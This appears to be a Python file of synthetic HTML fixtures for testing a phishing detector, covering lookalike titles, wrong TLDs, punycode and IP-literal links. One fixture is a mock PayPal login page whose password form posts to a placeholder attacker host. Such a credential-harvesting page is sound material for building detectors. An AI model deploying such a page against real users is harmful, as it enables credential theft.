"""Shared synthetic HTML fixtures, reconstructed from patterns observed on
real OpenPhish samples during calibration (see README.md -> MLOps / Limites
connues). Not live/hardcoded malicious URLs, so they stay stable over time.
"""

BENIGN_HTML = """
<html><head><title>Example Domain</title></head>
<body><p>This domain is for use in illustrative examples.</p></body></html>
"""

# Pattern observed on a real OpenPhish sample: brand name used verbatim as
# the page title, served from an attacker-controlled subdomain of a free
# PaaS host (vercel.app) that also contains the brand name in its own label.
LOOKALIKE_SUBDOMAIN_HTML = """
<html><head><title>WeTransfer</title>
<link rel="icon" href="https://cdn.other-host.example/favicon.ico">
</head>
<body><p>Your file is ready. Please verify your account to download it.</p></body></html>
"""

# Classic credential-phishing kit: password field posting to a domain that
# doesn't match the page it's embedded on, plus urgency language.
CREDENTIAL_PHISH_HTML = """
<html><head><title>PayPal - Secure Login</title></head>
<body>
<p>Your account has been suspended. Verify your account immediately.</p>
<form action="https://collector.evil-example.net/save" method="post">
  <input type="text" name="user">
  <input type="password" name="pass">
</form>
</body></html>
"""

# Same brand name, but on a country-code TLD that isn't actually one of the
# brand's real regional domains (see README.md -> Limites connues: "bonne
# marque, mauvaise extension"). Deliberately title-only/minimal so the test
# isolates the brand/domain-allowlist check from every other heuristic.
WRONG_TLD_LOOKALIKE_HTML = """
<html><head><title>Roblox - Sign in</title></head>
<body><p>Welcome to Roblox</p></body></html>
"""

PUNYCODE_IOC_HTML = """
<html><head><title>Login</title></head>
<body><a href="https://xn--pypal-4ve.com/login">Continue</a></body></html>
"""

IP_LITERAL_IOC_HTML = """
<html><head><title>Invoice</title></head>
<body><img src="http://203.0.113.42/track.png"></body></html>
"""
